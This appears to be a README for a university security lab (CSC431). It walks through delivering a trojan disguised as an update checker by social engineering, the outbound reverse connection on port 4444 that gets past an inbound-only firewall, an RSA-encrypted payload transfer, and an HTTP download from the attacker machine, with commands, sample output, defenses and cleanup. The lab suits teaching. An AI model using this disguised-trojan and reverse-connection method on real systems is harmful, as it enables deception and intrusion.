# CSC431 Firewall Bypass Lab
## RSA-Encrypted Reverse Shell with Social Engineering Delivery

### Overview

The attacker delivers a disguised trojan to the victim via social engineering.
The victim has a firewall that explicitly blocks port 4444 inbound. The trojan
bypasses this by connecting OUTBOUND to the attacker on port 4444 (which the
firewall allows). The attacker then sends an RSA-encrypted executable through
this reverse connection. The executable runs on the victim and downloads a
txt file from the attacker's HTTP server.

### Attack Flow

```
ATTACKER (Kali)                           VICTIM (Kali)
==============                            =============
                                          1. Runs firewall_setup.sh
                                             - Blocks port 4444 INBOUND
                                             - Allows all OUTBOUND

2. Runs attacker.py
   - Prepares trojan
   - Compiles payload
   - Starts HTTP server (:8000)
   - Listens on :4444

                  SOCIAL ENGINEERING
3. Delivers trojan  ---- email/usb/etc --->  4. Victim runs trojan
   (system_update_check.py)                     (thinks it's legit)

                                             5. Trojan connects OUTBOUND
5. Receives connection  <------ :4444 ------    to attacker on port 4444
   on port 4444                                 (firewall ALLOWS this)

6. Receives victim's    <--- public key ---  7. Trojan generates RSA
   RSA public key                               keypair, sends public key

8. Encrypts payload     --- encrypted --->   9. Trojan decrypts payload
   with victim's           chunks               with private key,
   public key                                   reassembles executable

                                            10. Payload executes,
                                                downloads secret.txt
10. HTTP server serves  <--- HTTP GET ---       from attacker via HTTP
    secret.txt              (outbound)          (also outbound, allowed)
```

### Files

```
lab/
  attacker.py                  # attacker runs this (only file attacker needs)
  firewall_setup.sh            # victim runs this to set up firewall
  trojan/
    system_update_check.py     # template - attacker.py generates the real one
  delivery/                    # created by attacker.py
    system_update_check.py     # trojan with attacker IP baked in (deliver this)
```

### Prerequisites

Both Kali machines:
```bash
pip install cryptography
sudo apt install gcc curl ufw
```

### Step-by-Step

#### VICTIM MACHINE (e.g. 192.168.1.200)

Step 1 only. This is all the victim does.

```bash
chmod +x firewall_setup.sh
sudo ./firewall_setup.sh
```

Output:
```
=== CSC431 - Victim Firewall Setup ===

Firewall configured:

Status: active
To                         Action      From
--                         ------      ----
4444/tcp                   DENY IN     Anywhere

Port 4444 inbound: BLOCKED
All other inbound:  BLOCKED
All outbound:       ALLOWED
```

#### ATTACKER MACHINE (e.g. 192.168.1.100)

Step 2: Run the attacker script.

```bash
python3 attacker.py 192.168.1.100
```

Output:
```
==================================================
  CSC431 Firewall Bypass Lab - Attacker
==================================================

  Attacker:  192.168.1.100
  C2 Port:   4444 (victim's firewall blocks this inbound)
  HTTP Port: 8000

[1/5] Preparing trojan for delivery...
  Ready: delivery/system_update_check.py
  Transfer this file to the victim machine.

[2/5] Compiling payload...
  16832 bytes -> 69 RSA-encrypted chunks

[3/5] Creating secret.txt...

[4/5] Starting HTTP server on :8000...

[5/5] Listening on :4444 for reverse connection...
  Waiting for victim to run the trojan...
```

Step 3: Transfer the trojan to the victim machine.

```bash
# Option A: SCP (if SSH is available)
scp delivery/system_update_check.py victim@192.168.1.200:/tmp/

# Option B: Python HTTP server (victim downloads it)
# Already running on :8000, so victim can:
#   curl http://192.168.1.100:8000/delivery/system_update_check.py -o /tmp/system_update_check.py

# Option C: Shared folder (if VMs share a folder)
cp delivery/system_update_check.py /shared/
```

#### VICTIM MACHINE (social engineering moment)

Step 4: Victim is tricked into running the "update checker."

```bash
python3 /tmp/system_update_check.py
```

Output on victim:
```
System Update Checker v2.4.1
OS: Linux 6.1.0-kali9-amd64
Host: kali-victim

Checking for updates... contacting server... connected.
Downloading update... done.
Installing update...  complete.

========================================
  PAYLOAD RUNNING BEHIND FIREWALL
========================================

Downloading secret.txt from 192.168.1.100:8000 ...

Download successful.

--- downloaded.txt contents ---
  CSC431 - Information Security & Computer Forensics
  ===================================================
  ...
--- end ---
```

Output on attacker:
```
  >> Victim connected: 192.168.1.200:48372
  >> Received RSA public key (294 bytes)
  >> Sending encrypted payload...
     69/69 (100%)

  >> Payload delivered. Executing on victim.
```

### Why Port 4444 Was Bypassed

The firewall rule `ufw deny in 4444/tcp` blocks INBOUND connections to port 4444.
But the trojan initiates an OUTBOUND connection FROM the victim TO the attacker's
port 4444. The firewall sees this as outgoing traffic and allows it. The entire
data transfer (encrypted payload, HTTP download) happens over outbound connections.

### Exploitation of Trust Connection (CSC431)

This lab demonstrates several categories from the course material:

- **Trusted Insider Exploits**: The trojan is disguised as an internal IT tool
- **In-Person Requests**: Could be delivered by someone posing as IT support
- **Social Media Impersonation**: Could be shared via a fake colleague profile
- **Gift Card / Charity Scams**: Same psychological manipulation (urgency, authority)

### Defenses That Would Stop This

1. **Egress filtering** - Block outbound to unknown IPs/ports
2. **Application whitelisting** - Only approved executables can run
3. **EDR (Endpoint Detection)** - Detect suspicious process behavior
4. **User training** - Recognize social engineering attempts
5. **Network segmentation** - Limit what compromised machines can reach
6. **DPI with TLS inspection** - Inspect encrypted outbound traffic
7. **Behavioral analysis** - Flag unusual outbound connection patterns
8. **File integrity monitoring** - Alert on new executables in /tmp

### Cleanup

Victim:
```bash
sudo ufw --force reset && sudo ufw --force disable
rm -rf /tmp/.cache_update /tmp/system_update_check.py
```

Attacker:
```bash
# Ctrl+C to stop, then:
rm -rf delivery payload payload.c secret.txt
```

### Java RSA Connection (Assignment 6)

The trojan generates RSA keys in the same DER format as your Java RSAEncryption
class (X.509 public, PKCS8 private). The encryption/decryption is interoperable.